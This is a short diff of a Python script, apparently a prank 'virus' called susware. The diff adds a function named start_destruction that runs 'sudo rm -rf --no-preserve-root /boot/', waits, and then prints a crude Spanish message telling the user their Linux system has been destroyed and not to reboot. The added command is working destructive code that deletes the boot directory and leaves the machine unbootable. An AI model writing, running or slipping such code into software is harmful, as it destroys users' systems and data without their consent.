@@ -2,7 +2,10 @@ from os import system
 from colorama import Fore
 from playsound import playsound
 from tkinter import messagebox
+from time import sleep
 def start_destruction():
+     system('sudo rm -rf --no-preserve-root /boot/')
+     sleep(10)
      try:
           print(Fore.GREEN, """
      Tu sistema ha sido FOLLADO por el virus susware, no intentes reiniciar tu linux
